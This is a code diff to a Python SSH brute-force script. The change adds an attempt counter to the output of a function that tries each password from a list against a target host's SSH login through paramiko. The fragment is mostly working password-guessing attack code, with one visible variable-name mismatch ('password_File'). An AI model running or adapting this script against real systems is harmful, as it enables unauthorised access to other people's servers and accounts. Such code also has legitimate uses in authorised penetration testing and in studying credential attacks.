@@ -20,16 +20,18 @@ def ssh_brute_force(target_ip, username, password_file):
         print(f"[!] File '{password_File}' not found")
         sys.exit (1)
     
+    tally = 0
     for password in passwords:
+        tally += 1
         try:
             ssh = paramiko.SSHClient()
             ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy ())
             ssh.connect(hostname=target_ip,username=username, password=password,timeout=timeout)
-            print(f"[+] Success! Username: {username} | Password:{password}")
+            print(f"{tally} [+] Success! Username: {username} | Password:{password}")
             ssh.close()
             return
         except paramiko.AuthenticationException:
-            print(f"[-] Failed:{password}")
+            print(f"{tally} [-] Failed:{password}")
         except (socket.error, paramiko.SSHException) as e:
             print(f"[!] Connection error:{str(e)}")
             time.sleep (2)
